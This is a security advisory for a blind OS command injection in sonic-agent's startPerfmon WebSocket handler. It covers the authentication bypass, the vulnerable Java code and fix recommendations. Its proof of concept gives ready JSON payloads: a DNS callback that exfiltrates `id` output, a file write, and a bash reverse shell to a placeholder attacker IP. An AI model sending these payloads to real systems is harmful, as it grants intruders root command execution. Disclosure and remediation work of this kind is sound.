# V-S004: Sonic Cloud Platform sonic-agent — `startPerfmon` WebSocket Message OS Command Injection (Blind RCE)

## Vulnerability Information

| Field | Details |
|-------|---------|
| Product | Sonic Cloud Platform — sonic-agent |
| Version | ≤ v2.7.2 (latest) |
| Type | CWE-287 (Improper Authentication) + CWE-78 (OS Command Injection) |
| Severity | **Critical** |
| CVSS v3.1 Score | **9.8** |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Repository | https://github.com/SonicCloudOrg/sonic-agent |
| Affected Files | `AndroidWSServer.java`, `AndroidSupplyTool.java` |

## Description

The sonic-agent Android WebSocket server (`AndroidWSServer.java`) accepts a `startPerfmon` message type whose `bundleId` field is **concatenated directly into a shell command** with no sanitization. The resulting command is executed via `sh -c` on the Agent host (Linux), enabling arbitrary OS command execution.

This is a **blind RCE** variant: unlike [V-S003](../V-S003_SonicAgent_pullFile_CmdInjection_RCE/) (pullFile, which has an output retrieval path), the `startPerfmon` injection executes commands silently without returning stdout to the attacker over the WebSocket. Out-of-band techniques (DNS callback, reverse shell, file write) are required to confirm execution or retrieve output.

### Authentication Bypass (same as V-S003)

The WebSocket endpoint `ws://{agent}:7777/websockets/android/{secretKey}/{udId}/{token}` can be accessed by any registered user because:

1. **`secretKey` is exposed** in plaintext via `GET /agents/list` (any registered account).
2. **`token` field** only checked for `length() == 0`; any non-empty string is accepted.

## Root Cause

**File:** `sonic-agent/src/main/java/org/cloud/sonic/agent/tools/AndroidSupplyTool.java`

```java
public static void startPerfmon(String udId, String pkg,
                                Session session, LogUtil logUtil, int interval) {

    String commandLine = pkg.isEmpty()
        ? String.format("%s perfmon -s %s -r %d -j --sys-cpu --sys-mem --sys-network",
              sas, udId, interval)
        : String.format("%s perfmon -s %s -r %d --proc-cpu --proc-fps --proc-mem " +
              "--proc-threads -p %s -j --sys-cpu --sys-mem --sys-network",
              sas, udId, interval,
              pkg);   // ← attacker-controlled bundleId, no filtering

    Process process = Runtime.getRuntime().exec(
        new String[]{"sh", "-c", commandLine}   // ← shell interprets injected metacharacters
    );
    // reads stdout (perfmon JSON stream) and forwards to WebSocket session
}
```

**Dispatch in `AndroidWSServer.onMessage()`:**

```java
case "startPerfmon" ->
    AndroidSupplyTool.startPerfmon(
        iDevice.getSerialNumber(),
        msg.getString("bundleId"),   // ← directly passed, no validation
        session, null, 1000
    );
```

**Injection format:**

```
 & <OS_CMD> && 
```

Expands to:
```bash
sh -c "sas perfmon -s {serial} -r 1000 --proc-cpu ... -p  & <OS_CMD> &&  -j --sys-cpu ..."
```

Shell parsing:
1. `sas perfmon ... -p` → runs in background (`&`)
2. `<OS_CMD>` → runs in foreground on Agent host
3. `&&` `-j ...` → subsequent flags fail as standalone command (non-fatal)

## Proof of Concept

### Connection (same as V-S003)

```
wss://<agent_host>:7777/websockets/android/<secretKey>/<udId>/poc_token
```

### Blind Execution — DNS Out-of-Band Verification

```json
{
  "type": "startPerfmon",
  "bundleId": " & ping -c 1 $(id | base64 | tr -d '\\n').your.dnslog.cn && "
}
```

The Agent host resolves the DNS query, confirming command execution with `id` output encoded in the subdomain. DNSLOG platform records:

```
dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=.your.dnslog.cn  →  178.x.x.x
```

Decoded: `uid=0(root) gid=0(root) groups=0(root)`

### File Write — Confirm via Agent Host Filesystem

```json
{
  "type": "startPerfmon",
  "bundleId": " & id > /tmp/perfmon_rce.txt && "
}
```

Verify on Agent host:
```bash
docker exec sonic-agent cat /tmp/perfmon_rce.txt
# uid=0(root) gid=0(root) groups=0(root)
```

### Reverse Shell

```json
{
  "type": "startPerfmon",
  "bundleId": " & bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1 && "
}
```

### Important: stdout Is Not Returned via WebSocket

Unlike V-S003 (pullFile), `startPerfmon` does not return the injected command's stdout over the WebSocket. This is because the Agent uses a **socket back-connect mechanism** to receive performance data from `sas perfmon`: `sas` announces a local port in its stdout, then Java connects to that port — but when `sas` fails (due to the injected `-p` with no argument), no socket is established, so no data is forwarded. The injected command executes but its output must be retrieved out-of-band.

```
Agent log (Thread-34, stdout reader):
  INFO: Output: {"result":"uid=0(root) gid=0(root) groups=0(root)"}
  → Logged internally but NOT sent to WebSocket client
```

### PoC Script

See [`poc_startperfmon_blind.py`](./poc_startperfmon_blind.py) for an interactive tool that automates agent/device enumeration and delivers injection payloads.

```
$ python poc_startperfmon_blind.py

[?] Sonic Server 地址: https://<target>:443
[?] 代理地址: socks5://127.0.0.1:1080

[+] 已选 Agent#1  agent-003.sonic.example.com:443
[+] 已选设备  udId=GQUS5TAQHQT4IBAI

输入命令类型:
1.pullFile
2.startPerfmon
2
input your command: id > /tmp/perfmon_rce.txt
```

## Comparison with V-S003 (pullFile)

| Feature | V-S003 pullFile | V-S004 startPerfmon |
|---------|-----------------|---------------------|
| Injection point | `path` field | `bundleId` field |
| Output retrieval | ✅ Two-step: write→push→pull→HTTP download | ❌ Blind only (OOB required) |
| Root cause file | `AndroidDeviceBridgeTool.java` | `AndroidSupplyTool.java` |
| Execution context | Agent host shell | Agent host shell |
| Requires device connected | Yes (for pull-back) | Yes (for WebSocket open) |
| CVSS | 9.9 | 9.8 |

## Fix Recommendation

| Priority | Action |
|----------|--------|
| **Critical** | Validate `bundleId` against Android package name format: `^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$` — reject any value not matching |
| **Critical** | Replace `Runtime.exec(new String[]{"sh","-c", commandLine})` with parameterized exec passing each argument separately — eliminates shell interpretation |
| **High** | Implement HMAC/JWT validation on WebSocket `token` path parameter |
| **High** | Remove `secretKey` from `/agents/list` API response for non-admin roles |
| **Medium** | Run sonic-agent process as a non-root user |
